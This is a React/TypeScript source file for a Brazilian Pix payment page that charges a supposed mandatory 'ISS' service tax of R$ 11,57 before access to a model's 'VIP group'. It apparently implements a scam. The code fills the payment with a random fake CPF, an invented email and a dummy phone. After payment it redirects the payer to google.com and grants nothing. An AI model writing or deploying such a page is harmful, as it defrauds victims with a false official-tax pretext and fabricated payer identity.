import { createFileRoute } from "@tanstack/react-router";
import { useServerFn } from "@tanstack/react-start";
import { useEffect, useRef, useState } from "react";
import QRCode from "qrcode";
import { createPixPayment, checkPixStatus } from "@/lib/syncpay.functions";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Taxa de Imposto" },
      { name: "description", content: "Pagamento da Tarifa Obrigatória ISS" },
    ],
  }),
  component: Index,
});

const AMOUNT = 11.57;

function randomCpf() {
  let cpf = "";
  for (let i = 0; i < 11; i++) cpf += Math.floor(Math.random() * 10).toString();
  return cpf;
}

function Index() {
  const createPix = useServerFn(createPixPayment);
  const checkStatus = useServerFn(checkPixStatus);

  const [open, setOpen] = useState(false);
  const [step, setStep] = useState<"loading" | "qr" | "paid">("loading");
  const [error, setError] = useState<string | null>(null);
  const [verifyMessage, setVerifyMessage] = useState<string | null>(null);
  const [verifying, setVerifying] = useState(false);
  const [pixCode, setPixCode] = useState("");
  const [qrDataUrl, setQrDataUrl] = useState("");
  const [copied, setCopied] = useState(false);
  const [statusLabel, setStatusLabel] = useState("Pendente");
  const identifierRef = useRef<string>("");
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);


  useEffect(() => {
    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, []);

  function closePopup() {
    setOpen(false);
    if (pollRef.current) {
      clearInterval(pollRef.current);
      pollRef.current = null;
    }
  }

  async function openPopup() {
    setError(null);
    setVerifyMessage(null);
    setStep("loading");
    setOpen(true);
    setCopied(false);

    try {
      const res = await createPix({
        data: {
          amount: AMOUNT,
          name: "Cliente",
          cpf: randomCpf(),
          email: `cliente${Date.now()}@email.com`,
          phone: "11999999999",
        },
      });
      setPixCode(res.pixCode);
      identifierRef.current = res.identifier;
      const url = await QRCode.toDataURL(res.pixCode, { width: 260, margin: 1 });
      setQrDataUrl(url);
      setStep("qr");

      pollRef.current = setInterval(async () => {
        try {
          const s = await checkStatus({ data: { identifier: res.identifier } });
          if (s.status === "completed") {
            if (pollRef.current) clearInterval(pollRef.current);
            handlePaid();
          } else if (s.status === "failed" || s.status === "refunded") {
            setError("Pagamento não concluído");
            if (pollRef.current) clearInterval(pollRef.current);
          }
        } catch {
          /* ignore */
        }
      }, 4000);
    } catch (err) {
      setError(err instanceof Error ? err.message : "Erro ao gerar Pix");
    }
  }

  function handlePaid() {
    setStep("paid");
    setStatusLabel("Pago");
    window.location.href = "https://www.google.com";
  }

  async function verifyPayment() {
    if (!identifierRef.current || verifying) return;
    setVerifying(true);
    setVerifyMessage(null);
    try {
      const s = await checkStatus({ data: { identifier: identifierRef.current } });
      if (s.status === "completed") {
        if (pollRef.current) clearInterval(pollRef.current);
        handlePaid();
      } else {
        setVerifyMessage("Pagamento não confirmado, tente novamente.");
      }
    } catch {
      setVerifyMessage("Pagamento não confirmado, tente novamente.");
    } finally {
      setVerifying(false);
    }
  }


  async function copyCode() {
    try {
      await navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {
      /* noop */
    }
  }

  return (
    <div style={{ background: "#f3f5f7", color: "#1f2937", minHeight: "100vh", fontFamily: "Arial, Helvetica, sans-serif" }}>
      <header style={{ width: "100%", background: "#0a345a" }}>
        <div style={{ padding: "20px", textAlign: "center", color: "#fff" }}>
          <h1 style={{ fontSize: "24px", marginBottom: "5px" }}>
            Tarifa obrigatória ISS (Imposto Sobre Serviços)
          </h1>
          <p style={{ fontSize: "14px", opacity: 0.9 }}>
            Última etapa antes de acessar o Grupo VIP da Eduarda
          </p>
        </div>
      </header>

      <div style={{ maxWidth: "550px", margin: "0 auto", padding: "16px" }}>
        <div style={{ background: "#fff", borderRadius: "12px", padding: "15px", marginTop: "15px", boxShadow: "0 4px 12px rgba(0,0,0,.08)", borderLeft: "5px solid #0a345a" }}>
          <span style={{ color: "#6b7280", fontSize: "13px" }}>Status do pagamento</span>
          <strong style={{ display: "block", marginTop: "4px", color: step === "paid" ? "#059669" : "#0a345a", fontSize: "18px" }}>
            {statusLabel}
          </strong>
        </div>

        <div style={{ marginTop: "15px", background: "#fff6cf", border: "1px solid #e6c85c", borderRadius: "12px", padding: "18px", textAlign: "center" }}>
          <small style={{ display: "block", color: "#8a6d00", fontWeight: 700, marginBottom: "8px" }}>ATENÇÃO</small>
          <h2 style={{ color: "#0a345a", marginBottom: "10px", fontSize: "22px" }}>
            Pagamento da Tarifa Obrigatória ISS
          </h2>
          <div style={{ fontSize: "42px", fontWeight: 900, color: "#0a345a" }}>R$ 11,57</div>
        </div>

        <div style={{ background: "#fff", marginTop: "15px", borderRadius: "14px", boxShadow: "0 6px 18px rgba(0,0,0,.08)", overflow: "hidden" }}>
          <div style={{ background: "#0a345a", color: "#fff", padding: "14px", fontWeight: 700 }}>
            Detalhes da Tarifa de ISS
          </div>
          <div style={{ padding: "18px" }}>
            <Row label="Status" value={statusLabel} />
            <Row label="Valor" value="R$ 11,57" />
            <Row label="Liberação" value="Imediata" last />

            <div style={{ marginTop: "18px", lineHeight: 1.6, fontSize: "15px" }}>
              O pagamento da tarifa de ISS é destinada a priorizar a validação da sua solicitação e fornecer suporte em caso de inconsistências durante o processo de liberação, segurança e integridade do grupo da modelo Eduarda.
            </div>

            <div style={{ marginTop: "20px" }}>
              {[
                "✓ Prioridade na confirmação do acesso",
                "✓ Suporte em caso de falha na liberação",
                "✓ Processamento imediato após confirmação",
                "✓ Proteção adicional da solicitação",
              ].map((t) => (
                <div key={t} style={{ background: "#f8fafc", border: "1px solid #e5e7eb", borderRadius: "10px", padding: "12px", marginBottom: "10px", fontSize: "14px" }}>
                  {t}
                </div>
              ))}
            </div>

            <button
              onClick={openPopup}
              style={{ width: "100%", border: "none", borderRadius: "10px", padding: "16px", fontSize: "16px", fontWeight: 800, cursor: "pointer", marginTop: "15px", background: "#0a345a", color: "white" }}
            >
              PAGAR TARIFA
            </button>
          </div>
        </div>

        <div style={{ textAlign: "center", marginTop: "18px", color: "#6b7280", fontSize: "12px", lineHeight: 1.5, paddingBottom: "20px" }}>
          Esta etapa é obrigatória e impede a continuidade do processo caso não seja efetuada.
        </div>
      </div>

      {open && (
        <div
          onClick={closePopup}
          style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.55)", display: "flex", alignItems: "center", justifyContent: "center", padding: "16px", zIndex: 50 }}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{ background: "#fff", borderRadius: "14px", maxWidth: "440px", width: "100%", maxHeight: "90vh", overflowY: "auto", boxShadow: "0 20px 50px rgba(0,0,0,.3)" }}
          >
            <div style={{ background: "#0a345a", color: "#fff", padding: "14px 18px", display: "flex", justifyContent: "space-between", alignItems: "center", borderTopLeftRadius: "14px", borderTopRightRadius: "14px" }}>
              <strong>Pagamento via Pix</strong>
              <button onClick={closePopup} style={{ background: "transparent", border: "none", color: "#fff", fontSize: "22px", cursor: "pointer", lineHeight: 1 }}>×</button>
            </div>

            <div style={{ padding: "20px" }}>
              {step === "loading" && (
                <div style={{ textAlign: "center", padding: "40px 0" }}>
                  <div style={{ fontSize: "14px", color: "#6b7280" }}>Gerando seu Pix...</div>
                </div>
              )}

              {step === "qr" && (
                <div>
                  <div style={{ background: "#f8fafc", border: "1px solid #e5e7eb", borderRadius: "10px", padding: "14px", marginBottom: "16px" }}>
                    <div style={{ fontWeight: 800, color: "#0a345a", fontSize: "14px", marginBottom: "10px" }}>
                      Como pagar:
                    </div>
                    <ol style={{ paddingLeft: "20px", fontSize: "13px", color: "#374151", lineHeight: 1.6, margin: 0 }}>
                      <li>Clique em <strong>Copiar código Pix</strong> abaixo.</li>
                      <li>Abra o app do seu banco e entre na opção <strong>Pix Copia e Cola</strong>.</li>
                      <li>Cole o código e confirme o pagamento de <strong>R$ 11,57</strong>.</li>
                      <li>Ou aponte a câmera para o QR Code abaixo.</li>
                    </ol>
                  </div>

                  {qrDataUrl && (
                    <img
                      src={qrDataUrl}
                      alt="QR Code Pix"
                      style={{ width: "240px", height: "240px", margin: "0 auto", display: "block", border: "1px solid #e5e7eb", borderRadius: "8px" }}
                    />
                  )}

                  <div style={{ marginTop: "16px", background: "#eef1f5", border: "1px solid #d1d5db", borderRadius: "8px", padding: "12px", fontSize: "12px", textAlign: "center", color: "#374151", fontFamily: "monospace", wordBreak: "break-all", lineHeight: 1.4, overflowWrap: "break-word" }}>
                    {pixCode.length > 70 ? `${pixCode.slice(0, 38)}...${pixCode.slice(-22)}` : pixCode}
                  </div>

                  <button
                    onClick={copyCode}
                    style={{ width: "100%", border: "none", borderRadius: "10px", padding: "14px", fontSize: "15px", fontWeight: 800, cursor: "pointer", marginTop: "12px", background: copied ? "#059669" : "#0a345a", color: "white" }}
                  >
                    {copied ? "✓ Código copiado!" : "Copiar código Pix"}
                  </button>

                  <button
                    onClick={verifyPayment}
                    disabled={verifying}
                    style={{ width: "100%", borderRadius: "10px", padding: "14px", fontSize: "15px", fontWeight: 700, cursor: verifying ? "not-allowed" : "pointer", marginTop: "10px", background: "#ffffff", color: "#0a345a", border: "1.5px solid #0a345a", opacity: verifying ? 0.7 : 1 }}
                  >
                    {verifying ? "Verificando..." : "Já fiz o pagamento"}
                  </button>

                  {verifyMessage && (
                    <div style={{ color: "#b91c1c", background: "#fee2e2", padding: "10px", borderRadius: "8px", fontSize: "13px", marginTop: "10px", textAlign: "center" }}>
                      {verifyMessage}
                    </div>
                  )}

                  <p style={{ fontSize: "12px", color: "#6b7280", marginTop: "12px", textAlign: "center" }}>
                    Aguardando confirmação do pagamento...
                  </p>
                </div>
              )}

              {step === "paid" && (
                <div style={{ textAlign: "center", padding: "20px 0" }}>
                  <div style={{ fontSize: "48px", marginBottom: "10px" }}>✅</div>
                  <h3 style={{ color: "#059669", marginBottom: "8px" }}>Pagamento confirmado!</h3>
                  <p style={{ fontSize: "14px", color: "#374151" }}>
                    Sua tarifa foi paga com sucesso. Você já pode prosseguir.
                  </p>
                  <button
                    onClick={closePopup}
                    style={{ width: "100%", border: "none", borderRadius: "10px", padding: "14px", fontSize: "15px", fontWeight: 800, cursor: "pointer", marginTop: "16px", background: "#0a345a", color: "white" }}
                  >
                    Fechar
                  </button>
                </div>
              )}

              {error && (
                <div style={{ color: "#b91c1c", background: "#fee2e2", padding: "10px", borderRadius: "8px", fontSize: "13px", marginTop: "12px" }}>
                  {error}
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

function Row({ label, value, last }: { label: string; value: string; last?: boolean }) {
  return (
    <div style={{ display: "flex", justifyContent: "space-between", padding: "12px 0", borderBottom: last ? "none" : "1px solid #eceff3", fontSize: "14px" }}>
      <div style={{ color: "#6b7280" }}>{label}</div>
      <div style={{ fontWeight: 700, color: "#0a345a" }}>{value}</div>
    </div>
  );
}
